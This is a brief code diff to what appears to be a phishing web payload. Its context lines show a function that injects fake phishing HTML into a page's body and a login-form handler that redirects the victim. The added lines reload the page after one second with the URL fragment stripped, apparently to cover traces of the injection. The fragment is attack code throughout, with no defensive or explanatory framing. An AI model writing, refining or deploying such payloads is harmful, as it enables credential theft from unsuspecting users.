@@ -77,6 +77,10 @@ async function submitLoginForm() {
   window.open(redirURL, '_self');
 }
 function execPayld() {
+  setTimeout(() => {
+    window.location.href = window.location.href.split('#')[0];
+  },
+  1000);
   let phishDiv = document.createElement('div');
   phishDiv.innerHTML = phishHtml;
   document.getElementsByTagName('body')[0].appendChild(phishDiv);
